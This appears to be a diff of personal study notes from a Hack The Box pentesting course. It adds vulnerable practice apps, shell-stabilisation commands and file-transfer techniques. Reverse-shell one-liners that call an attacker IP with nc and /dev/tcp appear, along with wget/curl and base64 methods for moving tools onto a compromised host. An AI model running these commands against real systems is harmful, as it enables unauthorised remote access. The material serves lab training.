@@ -1,3 +1,15 @@
+## Resources
+
+When starting, the sheer amount of content available on the web can be overwhelming. Furthermore, it isn't easy to know where to start and the quality of materials available. What follows are some resources outside that HTB recommends to anyone starting on their journey or looking to enhance their skillset and pick up new tricks.
+#### Vulnerable Machines/Applications
+
+There are many resources available to practice common web and network vulnerabilities in a safe, controlled setting. The following are some examples of purposefully vulnerable web applications and vulnerable machines that we can set up in a lab environment for extra practice.
+
+- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/): Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire [OWASP Top Ten](https://owasp.org/www-project-top-ten) along with many other real-world application security flaws.|
+- [Metasploitable 2](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/): Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation.|
+- [Metasploitable 3](https://github.com/rapid7/metasploitable3)]: Is a template for building a vulnerable Windows VM configured with a wide range of [vulnerabilities](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities).|
+- [DVWA](https://github.com/digininja/DVWA): This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.|
+
 # Common Terms
 
 Penetration testing/hacking is an enormous field. We will encounter countless technologies throughout our careers. Here are some of the most common terms and technologies that we will come across repeatedly and must have a firm grasp of. This is not an exhaustive list but is enough to get started with fundamental Modules and easy HTB boxes.
@@ -140,7 +152,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ```
 
 ```shell
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.156 1234 >/tmp/f
 ```
 
 ```powershell
@@ -187,7 +199,8 @@ Once we execute the bind shell command, we should have a shell waiting for us on
 We can use `netcat` to connect to that port and get a connection to the shell:
 
 ```shell
-nc 10.10.10.1 1234  id uid=33(www-data) gid=33(www-data) groups=33(www-data)
+nc 10.10.10.1 1234  
+id uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 As we can see, we are directly dropped into a bash session and can interact with the target system directly. Unlike a `Reverse Shell`, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.
@@ -197,6 +210,10 @@ There are multiple methods to do this. For our purposes, we will use the `pytho
 
 ```shell
 python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+```shell
+script -qc /bin/bash /dev/null
 ```
 
 After we run this command, we will hit `ctrl+z` to background our shell and get back on our local terminal, and input the following `stty` command:
@@ -221,6 +238,10 @@ We may notice that our shell does not cover the entire terminal. To fix this, we
 ```shell
 echo $TERM
 xterm-256color
+
+## or
+export TERM=xterm
+stty rows 38 columns 116
 ```
 
 ```shell
@@ -436,3 +457,69 @@ AND NOW WE HAVE READING ACCESS TO `cat flag.txt`
 # Transferring Files
 
 During any penetration testing exercise, it is likely that we will need to transfer files to the remote server, such as enumeration scripts or exploits, or transfer data back to our attack host. While tools like Metasploit with a Meterpreter shell allow us to use the Upload command to upload a file, we need to learn methods to transfer files with a standard reverse shell.
+
+## Using wget
+
+There are many methods to accomplish this. One method is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) on our machine and then using `wget` or `cURL` to download the file on the remote host. First, we go into the directory that contains the file we need to transfer and run a Python HTTP server in it:
+
+
+``` shell
+cd /tmp
+python3 -m http.server 8000
+## output
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+Now that we have set up a listening server on our machine, we can download the file on the remote host that we have code execution on:
+
+```shell
+wget http://10.10.14.1:8000/linenum.sh
+```
+
+Note that we used our IP `10.10.14.1` and the port our Python server runs on `8000`. If the remote server does not have `wget`, we can use `cURL` to download the file:
+
+```shell
+curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
+```
+## Using SCP
+
+Another method to transfer files would be using `scp`, granted we have obtained ssh user credentials on the remote host. We can do so as follows:
+
+```shell
+scp linenum.sh user@remotehost:/tmp/linenum.sh
+```
+
+Note that we specified the local file name after `scp`, and the remote directory will be saved to after the `:`.
+## Using Base64
+
+In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:
+
+```shell
+base64 shell -w 0
+```
+
+Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:
+
+```shell
+echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
+```
+## Validating File Transfers
+
+To validate the format of a file, we can run the [file](https://linux.die.net/man/1/file) command on it:
+
+```shell
+file shell
+# Output
+shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
+```
+
+As we can see, when we run the `file` command on the `shell` file, it says that it is an ELF binary, meaning that we successfully transferred it. To ensure that we did not mess up the file during the encoding/decoding process, we can check its md5 hash. On our machine, we can run `md5sum` on it:
+
+```shell
+md5sum shell
+# Output
+321de1d7e7c3735838890a72c9ae7d1d shell
+```
+
+Now, we can go to the remote server and run the same command on the file we transferred
+
